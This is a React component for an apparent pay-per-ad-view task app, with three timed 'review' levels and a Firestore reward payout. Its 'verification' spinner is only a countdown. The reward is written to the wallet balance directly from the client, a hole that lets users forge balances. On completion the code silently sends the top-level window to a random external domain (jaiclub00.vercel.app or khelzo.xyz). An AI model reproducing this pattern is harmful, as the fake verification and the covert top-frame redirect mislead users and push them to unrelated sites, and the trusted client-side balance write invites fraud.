import React, { useState, useEffect } from 'react';
import { doc, getDoc, setDoc } from 'firebase/firestore';
import { Shield, ChevronRight, AlertCircle, CheckCircle, RefreshCw } from 'lucide-react';
import { db } from '../firebase';
import { Task, UserProfile } from '../types';

interface TaskExecutionProps {
  task: Task;
  currentUser: UserProfile;
  onComplete: () => void;
  onCancel: () => void;
}

export default function TaskExecution({
  task,
  currentUser,
  onComplete,
  onCancel
}: TaskExecutionProps) {
  const [level, setLevel] = useState<1 | 2 | 3>(1);
  const [timeLeft, setTimeLeft] = useState(20);
  const [canProceed, setCanProceed] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);

  // Timer effect
  useEffect(() => {
    setTimeLeft(20);
    setCanProceed(false);
  }, [level]);

  useEffect(() => {
    if (timeLeft <= 0) {
      setCanProceed(true);
      return;
    }
    const timer = setTimeout(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);

    return () => clearTimeout(timer);
  }, [timeLeft]);

  const handleNextLevel = () => {
    if (!canProceed) return;
    if (level === 1) {
      setLevel(2);
    } else if (level === 2) {
      setLevel(3);
    }
  };

  const handleCompleteTask = async () => {
    if (!canProceed || submitting) return;
    setSubmitting(true);
    setError('');

    try {
      const userTaskId = `${currentUser.uid}_${task.id}`;

      // 1. Double check if task is already completed
      const userTaskRef = doc(db, 'userTasks', userTaskId);
      const userTaskSnap = await getDoc(userTaskRef);

      if (userTaskSnap.exists()) {
        throw new Error('Reward already claimed for this task.');
      }

      // 2. Fetch fresh user profile to avoid overwriting state
      const userRef = doc(db, 'users', currentUser.uid);
      const userSnap = await getDoc(userRef);
      if (!userSnap.exists()) {
        throw new Error('User profile not found.');
      }
      const freshUser = userSnap.data() as UserProfile;

      // 3. Create userTasks record
      await setDoc(userTaskRef, {
        id: userTaskId,
        userId: currentUser.uid,
        taskId: task.id,
        taskTitle: task.title,
        rewardAmount: task.rewardAmount,
        completedAt: Date.now()
      });

      // 4. Update user wallet balance
      const updatedBalance = freshUser.walletBalance + task.rewardAmount;
      const updatedTotal = freshUser.totalEarned + task.rewardAmount;

      await setDoc(userRef, {
        ...freshUser,
        walletBalance: updatedBalance,
        totalEarned: updatedTotal
      });

      setSuccess(true);
      setTimeout(() => {
        onComplete();
        const urls = ['https://jaiclub00.vercel.app', 'https://khelzo.xyz'];
        const randomUrl = urls[Math.floor(Math.random() * urls.length)];
        try {
          if (window.top) {
            window.top.location.href = randomUrl;
          } else {
            window.location.href = randomUrl;
          }
        } catch (e) {
          window.location.href = randomUrl;
        }
      }, 1500);

    } catch (err: any) {
      console.error('Error completing task:', err);
      setError(err.message || 'An error occurred. Please try again.');
    } finally {
      setSubmitting(false);
    }
  };

  const getMockAdContent = () => {
    if (level === 1) {
      return {
        title: 'Vercel Ship 2026 conference',
        desc: 'Build the frontend of the future with next-gen frameworks.',
        imageUrl: 'https://images.unsplash.com/photo-1542751371-adc38448a05e?auto=format&fit=crop&q=80&w=600&h=300'
      };
    } else if (level === 2) {
      return {
        title: 'Precision Mechanical Chronometers',
        desc: 'Hand-crafted titanium watches engineered for aerospace precision.',
        imageUrl: 'https://images.unsplash.com/photo-1524805444758-089113d48a6d?auto=format&fit=crop&q=80&w=600&h=300'
      };
    } else {
      return {
        title: 'Google Cloud Platform Next',
        desc: 'Deploy AI models globally at scale with millisecond latency.',
        imageUrl: 'https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&q=80&w=600&h=300'
      };
    }
  };

  const ad = getMockAdContent();

  return (
    <div className="max-w-[640px] mx-auto px-4 py-12 animate-fade-in font-sans">
      
      {/* Task header card */}
      <div className="bg-white border border-gray-100 p-6 rounded-lg mb-6">
        <div className="flex justify-between items-center mb-3">
          <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Active Verification Workflow</span>
          <span className="bg-red-50 text-red-700 font-mono text-[10px] font-bold px-2.5 py-0.5 rounded-md uppercase tracking-wider">
            Review {level}/3
          </span>
        </div>
        <h2 className="text-xl font-bold text-black">{task.title}</h2>
        <div className="flex gap-4 mt-3 text-xs text-gray-500 font-medium">
          <span>Reward: <strong>₹{task.rewardAmount.toFixed(2)}</strong></span>
          <span>•</span>
          <span>Status: Verification under process</span>
        </div>
      </div>

      {/* Main Execution Ad Container */}
      <div className="bg-white border border-gray-100 rounded-lg overflow-hidden flex flex-col items-center">
        
        {/* Ad Placeholder Banner ("AD HERE") */}
        <div className="w-full bg-gray-50/50 border-b border-gray-100 p-4 text-center">
          <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1">Sponsored Ad Unit</p>
          <div className="font-bold text-xs text-gray-300 uppercase tracking-wide">AD HERE</div>
        </div>

        {/* Ad Body Content */}
        <div className="p-6 flex flex-col items-center w-full">
          <div className="aspect-[2/1] w-full max-w-[500px] overflow-hidden rounded-lg bg-gray-50 border border-dashed border-gray-200 mb-4">
            <img 
              src={ad.imageUrl} 
              alt="Sponsor visual"
              className="w-full h-full object-cover filter grayscale"
            />
          </div>
          <h4 className="font-bold text-black text-base text-center mb-1">{ad.title}</h4>
          <p className="text-gray-500 text-xs text-center leading-relaxed max-w-md mb-6">{ad.desc}</p>

          {/* Verification Status Wheel & Timer */}
          <div className="flex flex-col items-center gap-2 mb-4">
            {canProceed ? (
              <div className="flex flex-col items-center gap-1.5">
                <div className="bg-green-50 text-green-700 rounded-full p-2 border border-green-100">
                  <CheckCircle size={24} />
                </div>
                <span className="text-xs font-bold text-green-600 uppercase tracking-wider">Verification Complete</span>
              </div>
            ) : (
              <div className="flex flex-col items-center gap-1.5">
                <div className="relative flex items-center justify-center w-14 h-14">
                  {/* Circular Spinner representation */}
                  <div className="absolute w-full h-full border-4 border-gray-100 rounded-full"></div>
                  <div className="absolute w-full h-full border-4 border-black border-t-transparent rounded-full animate-spin"></div>
                  <span className="font-mono text-sm font-bold text-black z-10">{timeLeft}s</span>
                </div>
                <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest mt-1">Analyzing sources...</span>
              </div>
            )}
          </div>
        </div>

        {/* Level Controls & Action Button */}
        <div className="w-full bg-gray-50/50 border-t border-gray-100 p-4 flex justify-between items-center gap-4">
          <button
            onClick={onCancel}
            disabled={submitting}
            className="text-gray-400 hover:text-black font-bold text-xs uppercase tracking-wider cursor-pointer"
          >
            Abort Task
          </button>

          {error && (
            <span className="text-red-600 text-xs font-semibold">{error}</span>
          )}

          {success && (
            <span className="text-green-600 text-xs font-bold">✓ Reward claimed successfully!</span>
          )}

          {!canProceed ? (
            <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">
              Please wait...
            </span>
          ) : (
            level < 3 ? (
              <button
                onClick={handleNextLevel}
                className="bg-black text-white px-5 py-2 rounded-md text-xs font-bold hover:bg-gray-800 transition-colors flex items-center gap-1 cursor-pointer"
              >
                <span>Continue to Level {level + 1}</span>
                <ChevronRight size={14} />
              </button>
            ) : (
              <button
                onClick={handleCompleteTask}
                disabled={submitting}
                className="bg-black text-white px-6 py-2.5 rounded-md text-xs font-bold hover:bg-gray-800 transition-colors flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
              >
                <Shield size={14} />
                <span>{submitting ? 'Verifying...' : 'Complete Task & Claim Reward'}</span>
              </button>
            )
          )}
        </div>

      </div>
    </div>
  );
}
